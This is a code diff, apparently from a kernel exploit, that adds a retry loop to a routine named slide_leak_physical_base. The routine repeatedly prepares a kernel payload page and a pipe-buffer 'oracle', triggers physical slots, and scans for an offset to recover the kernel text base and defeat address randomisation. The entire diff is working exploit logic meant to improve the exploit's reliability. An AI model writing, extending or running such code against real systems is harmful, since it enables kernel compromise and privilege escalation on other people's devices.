@@ -738,47 +738,82 @@ static int slide_leak_physical_base(void) {
   }
   return 0;
 #else
-  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
-  if (!page_base) {
-    return 0;
-  }
-  if (!slide_trigger_physical_slot(P0_ORACLE_GATE_SLOT)) {
-    pr_error("p0 physical pipe gate trigger failed\n");
-    return 0;
-  }
-  int gate_result = verify_p0_pipe_oracle_gate();
-  if (getenv("P0_ORACLE_GATE_DIAG")) {
-    pr_info("p0 physical gate diagnostic result=%d\n", gate_result);
-    if (gate_result != 0) {
-      slide_restore_physical_oracle();
+  /*
+   * Retry the gate inside this process before giving up.  A reclaim miss
+   * (gate_result == 0, i.e. hits=0 changed=0) means no pipe buffer moved at
+   * all: the kernel is untouched, so a fresh payload page plus a freshly
+   * prepared pipe oracle can simply be tried again.  Previously every miss
+   * cost a full supervisor restart (~25s delay + quiet window) because the
+   * non-REQUIRE_FRESH_P0_SESSION path ran the gate exactly once.
+   *
+   * The loop stops on the first attempt that actually writes (app_publish_p0_
+   * dirty / gate_result != 0); those paths keep the original single-shot
+   * restore semantics.
+   */
+#ifdef SLIDE_FRESH_PAGE_ATTEMPTS
+  const int gate_attempts = SLIDE_FRESH_PAGE_ATTEMPTS;
+#else
+  const int gate_attempts = 1;
+#endif
+  for (int gate_attempt = 1; gate_attempt <= gate_attempts; gate_attempt++) {
+    if (gate_attempt != 1) {
+      reset_pipe_attempt();
+      if (!prepare_p0_pipe_oracle()) {
+        pr_error("p0 physical pipe refresh failed attempt=%d/%d\n",
+                 gate_attempt, gate_attempts);
+        return 0;
+      }
+      pr_info("p0 pipe oracle refreshed attempt=%d/%d base=%016zx\n",
+              gate_attempt, gate_attempts, pipebuf_page_base);
     }
-    return 0;
+    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
+    if (!page_base) {
+      return 0;
+    }
+    if (!slide_trigger_physical_slot(P0_ORACLE_GATE_SLOT)) {
+      pr_error("p0 physical pipe gate trigger failed attempt=%d/%d\n",
+               gate_attempt, gate_attempts);
+      continue;
+    }
+    int gate_result = verify_p0_pipe_oracle_gate();
+    pr_info("p0 physical gate result=%d attempt=%d/%d\n",
+            gate_result, gate_attempt, gate_attempts);
+    if (getenv("P0_ORACLE_GATE_DIAG")) {
+      pr_info("p0 physical gate diagnostic result=%d\n", gate_result);
+      if (gate_result != 0) {
+        slide_restore_physical_oracle();
+      }
+      return 0;
+    }
+    if (gate_result == 0) {
+      pr_warning("p0 physical pipe reclaim miss attempt=%d/%d\n",
+                 gate_attempt, gate_attempts);
+      continue;
+    }
+    app_publish_p0_dirty();
+    if (gate_result < 0) {
+      pr_error("p0 physical pipe gate changed unexpected pages\n");
+      slide_restore_physical_oracle();
+      return 0;
+    }
+    if (!slide_trigger_physical_slot(P0_ORACLE_PROBE_SLOT)) {
+      slide_restore_physical_oracle();
+      return 0;
+    }
+    uintptr_t offset = scan_p0_pipe_oracle();
+    if (offset == (uintptr_t)-1) {
+      slide_restore_physical_oracle();
+      return 0;
+    }
+    if (!slide_restore_physical_oracle()) {
+      return 0;
+    }
+    size_t elapsed_ms = (size_t)((gettime_ns() - started) / 1000000ULL);
+    pr_success("p0 physical elapsed_ms=%zu gate_attempt=%d/%d\n",
+               elapsed_ms, gate_attempt, gate_attempts);
+    return slide_commit_stext(KIMAGE_TEXT_BASE + offset, "physical");
   }
-  if (gate_result == 0) {
-    pr_warning("p0 physical pipe reclaim miss\n");
-    return 0;
-  }
-  app_publish_p0_dirty();
-  if (gate_result < 0) {
-    pr_error("p0 physical pipe gate changed unexpected pages\n");
-    slide_restore_physical_oracle();
-    return 0;
-  }
-  if (!slide_trigger_physical_slot(P0_ORACLE_PROBE_SLOT)) {
-    slide_restore_physical_oracle();
-    return 0;
-  }
-  uintptr_t offset = scan_p0_pipe_oracle();
-  if (offset == (uintptr_t)-1) {
-    slide_restore_physical_oracle();
-    return 0;
-  }
-  if (!slide_restore_physical_oracle()) {
-    return 0;
-  }
-  size_t elapsed_ms = (size_t)((gettime_ns() - started) / 1000000ULL);
-  pr_success("p0 physical elapsed_ms=%zu\n", elapsed_ms);
-  return slide_commit_stext(KIMAGE_TEXT_BASE + offset, "physical");
+  return 0;
 #endif
 }
 
